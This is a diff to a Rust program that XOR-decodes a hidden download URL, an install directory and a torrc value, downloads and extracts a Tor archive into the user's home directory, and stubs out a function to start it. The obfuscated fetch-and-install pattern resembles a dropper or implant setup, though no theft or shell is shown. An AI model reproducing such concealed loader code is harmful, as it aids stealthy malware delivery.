@@ -6,13 +6,14 @@ use std::fs::File;
 use std::path::PathBuf;
 use std::{io, thread, time, error};
 
-fn main() {
+fn main() -> Result<(), Box<dyn error::Error>> {
     let setting: setting::Setting = load_settings();
 
-    match download_and_extract_tor(&setting) {
-        Ok(()) => {},
-        Err(error) => panic!("problem to download and extract tor: {:?}", error)
-    };
+    download_and_extract_tor(&setting)?;
+
+    start_tor_binary(&setting);
+
+    Ok(())
 }
 
 fn download_and_extract_tor(setting: &setting::Setting) -> Result<(), Box<dyn error::Error>> {
@@ -28,7 +29,7 @@ fn download_and_extract_tor(setting: &setting::Setting) -> Result<(), Box<dyn er
             );
         }
 
-        match download(&setting.windows_url, &mut file) {
+        match download(&setting.tor_url, &mut file) {
             Ok(_) => {
                 break;
             },
@@ -41,10 +42,10 @@ fn download_and_extract_tor(setting: &setting::Setting) -> Result<(), Box<dyn er
         thread::sleep(sleep_time);
     };
 
-    std::fs::create_dir_all(&setting.linux_path)?;
+    std::fs::create_dir_all(&setting.tor_dir)?;
 
     let mut zip = zip::ZipArchive::new(file)?;
-    zip.extract(&setting.linux_path)?;
+    zip.extract(&setting.tor_dir)?;
 
     Ok(())
 }
@@ -52,40 +53,32 @@ fn download_and_extract_tor(setting: &setting::Setting) -> Result<(), Box<dyn er
 fn load_settings() -> setting::Setting {
     let key = String::from(config::ENC_KEY); 
 
-    let windows_url = xor::decode(
+    let tor_url = xor::decode(
         &key, 
-        &String::from(config::ENC_WINDOWS_URL)
+        &String::from(config::ENC_TOR_URL)
     ).unwrap_or_else(|_| {
-        panic!("problem unserializing windows url");
+        panic!("problem unserializing url");
     });
 
-    let linux_url = xor::decode(
+    let tor_dir = xor::decode(
         &key,
-        &String::from(config::ENC_LINUX_URL)
+        &String::from(config::ENC_TOR_DIR)
     ).unwrap_or_else(|_| {
-        panic!("problem unserializing linux url");
+        panic!("problem unserializing directory");
     });
 
-    let windows_path = xor::decode(
+    let torrc = xor::decode(
         &key,
-        &String::from(config::ENC_WINDOWS_PATH)
+        &String::from(config::ENC_TORRC)
     ).unwrap_or_else(|_| {
-        panic!("problem unserializing windows path");
-    });
-
-    let linux_path = xor::decode(
-        &key,
-        &String::from(config::ENC_LINUX_PATH)
-    ).unwrap_or_else(|_| {
-        panic!("problem unserializing linux path");
+        panic!("problem unserializing rc");
     });
 
     setting::Setting {
         key,
-        windows_url,
-        linux_url,
-        windows_path: expand_user_dir(&windows_path),
-        linux_path: expand_user_dir(&linux_path)
+        tor_url,
+        torrc,
+        tor_dir: expand_user_dir(&tor_dir)
     }
 }
 
@@ -115,5 +108,9 @@ fn download(url: &String, out_file: &mut File) -> Result<(), ureq::Error> {
         panic!("problem writing download to file: {:?}", error);
     });
 
+    Ok(())
+}
+
+fn start_tor_binary(setting: &setting::Setting) -> Result<(), Box<dyn error::Error>> {
     Ok(())
 }
